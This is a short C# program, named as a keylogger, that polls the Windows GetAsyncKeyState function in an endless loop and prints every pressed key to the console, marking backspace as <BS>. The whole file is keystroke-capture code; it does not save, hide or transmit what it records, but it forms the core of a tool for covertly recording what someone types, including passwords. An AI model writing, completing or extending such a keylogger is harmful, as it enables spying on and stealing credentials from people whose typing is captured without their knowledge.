using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Key_Logger
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 127; i++)
                {
                    int PressedOrNot = GetAsyncKeyState(i);
                    if (PressedOrNot != 0)
                    {
                        switch (i){
                            case 8:
                                {
                                    Console.Write("<BS>");
                                    break;
                                }
                            default:
                                {
                                    Console.Write((char)i);
                                    break;
                                }
                        }
                    }
                }
            }
        }
    }
}
